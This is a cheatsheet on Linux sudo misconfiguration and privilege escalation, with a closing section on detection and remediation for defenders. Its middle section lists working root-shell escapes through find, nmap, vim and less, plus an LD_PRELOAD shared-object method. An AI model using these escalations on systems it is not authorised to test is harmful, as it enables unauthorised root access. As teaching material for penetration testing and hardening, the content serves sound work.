## 🔑 Cheatsheet: Sudo Privilege Escalation

The `sudo` command allows a permitted user to execute a command as another user, typically the superuser (`root`). A misconfiguration occurs when the permissions granted are too broad, allowing a user to perform unintended actions, often leading to a full root shell.

### ## What to Look For (Reconnaissance)

The primary command to check your own `sudo` privileges is `sudo -l`. An attacker will run this immediately after gaining initial access to a machine.

* **Check Your Privileges:**
    ```bash
    sudo -l
    ```
* **Interpreting the Output:** The output will list the commands you are allowed to run. Pay close attention to:
    * `(ALL : ALL) ALL`: You are all-powerful.
    * `(root) NOPASSWD: /usr/bin/find`: You can run the `find` command as root without a password.
    * User-defined aliases that might contain dangerous commands.
    * Entries that preserve environment variables (`env_keep`).

---

### ## Common Exploitable Scenarios & Payloads

The goal is to use an allowed command to spawn a root shell. **GTFOBins** is the ultimate resource for finding shell escapes for Unix binaries.

#### **Scenario 1: `(ALL) ALL`**
This is the jackpot. It means you can run any command as root.

* **Output of `sudo -l`:**
    ```
    User user may run the following commands on this host:
        (ALL : ALL) ALL
    ```
* **Exploitation:**
    ```bash
    sudo su
    # Or
    sudo /bin/bash
    # Or
    sudo -i
    ```

#### **Scenario 2: Binaries with Shell Escapes**
Many standard Linux commands can be used to execute other commands or spawn a shell.

* **Output of `sudo -l`:**
    ```
    (root) NOPASSWD: /usr/bin/find
    (root) /usr/bin/nmap
    (root) /usr/bin/vim
    ```
* **Exploitation (Examples from GTFOBins):**
    * **find:**
        ```bash
        sudo find . -exec /bin/sh \; -quit
        ```
    * **nmap (interactive mode):**
        ```bash
        sudo nmap --interactive
        # At the nmap prompt, type: !sh
        ```
    * **vim:**
        ```bash
        sudo vim
        # In vim, type: :!/bin/sh
        ```
    * **less/more:** Open a file with `sudo less /etc/profile` and then type `!/bin/sh`.

#### **Scenario 3: `LD_PRELOAD` / `LD_LIBRARY_PATH` Abuse**
If the `sudoers` configuration preserves the `LD_PRELOAD` variable, you can load a malicious shared object into a program executed with `sudo`.

* **Output of `sudo -l` shows:**
    ```
    env_keep+=LD_PRELOAD
    ```
* **Simplified Exploitation:**
    1.  Write a simple C file (`shell.c`) that spawns a shell.
    2.  Compile it as a shared object: `gcc -fPIC -shared -o shell.so shell.c`
    3.  Run any allowed sudo command with `LD_PRELOAD` pointing to your malicious library:
        ```bash
        sudo LD_PRELOAD=/tmp/shell.so find
        ```

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **Audit Logs:** Sudo command executions are typically logged to `/var/log/auth.log` or `/var/log/secure`. Monitor these logs for suspicious or unusual commands being executed by users via `sudo`.
* **Behavioral Analysis:** An administrator running `sudo find` to locate a file is normal. A web server's user account (`www-data`) running `sudo find` to execute a shell is a massive red flag.

#### **How to Prevent Sudo Misconfigurations**

* **Principle of Least Privilege:** This is the most important rule. **Never** use `(ALL : ALL) ALL`. Grant users access to the *specific* commands they need for their job, and nothing more.
* **Specify Full Paths:** Always use the full path to a binary (e.g., `/usr/sbin/service`) to prevent an attacker from manipulating the `$PATH` to run their own malicious script.
    ```
    # Bad:
    user ALL=(root) service

    # Good:
    user ALL=(root) /usr/sbin/service
    ```
* **Avoid Dangerous Binaries:** Do not grant `sudo` access to programs that can easily spawn shells. This includes editors (`vim`, `nano`), pagers (`less`, `more`), scripting languages (`perl`, `python`), and tools like `find`, `tar`, `nmap`, etc., unless absolutely unavoidable.
* **Use `secure_path`:** Ensure the `secure_path` directive is set in your `/etc/sudoers` file to define a safe and standard `PATH` for commands executed by `sudo`.
* **Regular Audits:** Periodically review the `/etc/sudoers` file and any files in `/etc/sudoers.d/` to remove unnecessary permissions and ensure rules are still appropriate. Use the `visudo` command to edit the file, as it performs syntax checking.
